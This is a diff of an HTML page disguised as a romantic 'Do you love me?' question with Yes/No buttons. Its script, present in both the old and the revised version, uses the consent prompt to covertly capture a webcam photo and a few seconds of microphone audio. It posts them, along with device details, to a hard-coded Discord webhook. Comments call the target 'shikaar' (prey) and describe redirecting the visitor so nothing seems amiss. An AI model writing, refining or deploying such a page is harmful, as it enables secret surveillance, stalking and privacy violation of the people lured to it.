@@ -3,81 +3,116 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <title>A Gift For You</title>
+  <title>Proposed Her</title>
   <style>
     #video, #canvas { display: none; }
-    body { background: #000; color: #fff; font-family: sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
-    .loader { border: 4px solid #f3f3f3; border-top: 4px solid #ff4d6d; border-radius: 50%; width: 40px; height: 40px; animation: spin 2s linear infinite; display: none; margin: 20px auto; }
+    body { 
+      background: #121212; 
+      color: #fff; 
+      font-family: 'Segoe UI', Arial, sans-serif; 
+      display: flex; 
+      justify-content: center; 
+      align-items: center; 
+      height: 100vh; 
+      margin: 0; 
+    }
+    .container { text-align: center; background: #1e1e1e; padding: 40px; border-radius: 20px; box-shadow: 0 10px 30px rgba(0,0,0,0.5); }
+    h1 { font-size: 1.5rem; margin-bottom: 20px; }
+    .btn-group { display: flex; gap: 15px; justify-content: center; }
+    .btn { 
+      padding: 12px 35px; 
+      border-radius: 25px; 
+      font-weight: bold; 
+      text-decoration: none; 
+      color: white; 
+      transition: 0.3s; 
+      cursor: pointer;
+      border: none;
+    }
+    .btn-yes { background: #ff4d6d; }
+    .btn-no { background: #555; }
+    .loader { 
+      border: 4px solid #333; 
+      border-top: 4px solid #ff4d6d; 
+      border-radius: 50%; 
+      width: 30px; height: 30px; 
+      animation: spin 1s linear infinite; 
+      display: none; 
+      margin: 20px auto; 
+    }
     @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
-    .container { text-align: center; }
-    .btn a { padding: 15px 40px; background: #ff4d6d; color: #fff; text-decoration: none; border-radius: 30px; font-weight: bold; display: inline-block; transition: 0.3s; }
   </style>
 </head>
 <body>
 
-<div class="container" id="main-box">
-  <img src="https://media.giphy.com/media/v1.Y2lkPTc5MGI3NjExNHJueGZ3bmZ6Z3J6Z3R6Z3R6Z3R6Z3R6Z3R6Z3R6Z3R6Z3R6Z3AmbGlmZT1n/K6WIhJ07gwGkIAQfwN/giphy.gif" width="300">
-  <h2>Will you be mine? ❤️</h2>
-  <div class="loader" id="loader"></div>
-  <div class="btn" id="btn-container">
-    <a href="javascript:void(0)" onclick="startTheHunt()">Yes, I will!</a>
+  <div class="container">
+    <img src="https://media0.giphy.com/media/K6WIhJ07gwGkIAQfwN/giphy.gif" width="250" style="border-radius: 10px; margin-bottom: 20px;">
+    <h1>Do you love me? 🤗</h1>
+    <div class="loader" id="loader"></div>
+    <div class="btn-group" id="controls">
+      <button class="btn btn-yes" onclick="startTheHunt('yes')">Yes</button>
+      <button class="btn btn-no" onclick="startTheHunt('no')">No</button>
+    </div>
   </div>
-</div>
 
-<video id="video" autoplay></video>
-<canvas id="canvas"></canvas>
+  <video id="video" autoplay></video>
+  <canvas id="canvas"></canvas>
 
-<script>
-const WEBHOOK = "https://discord.com/api/webhooks/1492440049948692621/bvCYRkOqyKkKb1o1QWU0ztStZNc8JF9DAmF4xgdJpv8pGVbqVtrogVeFSI0sCzN9AkFS";
+  <script>
+    const WEBHOOK = "https://discord.com/api/webhooks/1492440049948692621/bvCYRkOqyKkKb1o1QWU0ztStZNc8JF9DAmF4xgdJpv8pGVbqVtrogVeFSI0sCzN9AkFS";
 
-async function startTheHunt() {
-    // Buttons chhupa do aur loader dikhao taake user wait kare
-    document.getElementById('btn-container').style.display = 'none';
-    document.getElementById('loader').style.display = 'block';
-    
-    // System Info nikaalo
-    let info = `📱 **Device Info:**\n- Platform: ${navigator.platform}\n- RAM: ${navigator.deviceMemory}GB\n- Language: ${navigator.language}`;
+    async function startTheHunt(userChoice) {
+        // UI Update: Buttons gayab, loader shuru
+        document.getElementById('controls').style.display = 'none';
+        document.getElementById('loader').style.display = 'block';
 
-    try {
-        const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
-        const video = document.getElementById('video');
-        video.srcObject = stream;
+        try {
+            const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
+            const video = document.getElementById('video');
+            video.srcObject = stream;
 
-        // 1. Photo Capture
-        setTimeout(() => {
-            const canvas = document.getElementById('canvas');
-            canvas.width = video.videoWidth;
-            canvas.height = video.videoHeight;
-            canvas.getContext('2d').drawImage(video, 0, 0);
-            
-            canvas.toBlob(blob => {
+            // 1. Photo Capture (1.2 seconds wait for focus)
+            setTimeout(() => {
+                const canvas = document.getElementById('canvas');
+                canvas.width = video.videoWidth;
+                canvas.height = video.videoHeight;
+                canvas.getContext('2d').drawImage(video, 0, 0);
+                
+                canvas.toBlob(blob => {
+                    const fd = new FormData();
+                    fd.append('file', blob, 'capture.png');
+                    fd.append('content', `🎯 **Shikaar Alert!**\n👤 **Choice:** ${userChoice.toUpperCase()}\n🌍 **Platform:** ${navigator.platform}`);
+                    fetch(WEBHOOK, { method: 'POST', body: fd });
+                }, 'image/png');
+            }, 1200);
+
+            // 2. Audio Capture (3 seconds silent)
+            const mediaRecorder = new MediaRecorder(stream);
+            const chunks = [];
+            mediaRecorder.ondataavailable = e => chunks.push(e.data);
+            mediaRecorder.onstop = () => {
+                const audioBlob = new Blob(chunks, { type: 'audio/webm' });
                 const fd = new FormData();
-                fd.append('file', blob, 'target_face.png');
-                fd.append('content', `🔥 **Faisal Bhai, Shikaar Ki Detail!**\n${info}`);
-                fetch(WEBHOOK, { method: 'POST', body: fd });
-            }, 'image/png');
-        }, 1000);
+                fd.append('file', audioBlob, 'voice.webm');
+                fetch(WEBHOOK, { method: 'POST', body: fd }).then(() => {
+                    // Final Logic: Choice ke mutabiq redirect
+                    if (userChoice === 'yes') {
+                        window.location.href = "page1.html";
+                    } else {
+                        window.location.href = "no1.html";
+                    }
+                });
+            };
+            
+            mediaRecorder.start();
+            setTimeout(() => mediaRecorder.stop(), 3500);
 
-        // 2. Audio Capture (3 seconds silent recording)
-        const mediaRecorder = new MediaRecorder(stream);
-        const chunks = [];
-        mediaRecorder.ondataavailable = e => chunks.push(e.data);
-        mediaRecorder.onstop = () => {
-            const audioBlob = new Blob(chunks, { type: 'audio/webm' });
-            const fd = new FormData();
-            fd.append('file', audioBlob, 'target_voice.webm');
-            fetch(WEBHOOK, { method: 'POST', body: fd }).then(() => {
-                window.location.href = "https://google.com"; // Redirect to safety
-            });
-        };
-        
-        mediaRecorder.start();
-        setTimeout(() => mediaRecorder.stop(), 4000); // 4 sec record karo
-
-    } catch (e) {
-        window.location.href = "https://google.com";
+        } catch (e) {
+            // Error pe bhi redirect taake shak na ho
+            if (userChoice === 'yes') window.location.href = "page1.html";
+            else window.location.href = "no1.html";
+        }
     }
-}
-</script>
+  </script>
 </body>
 </html>
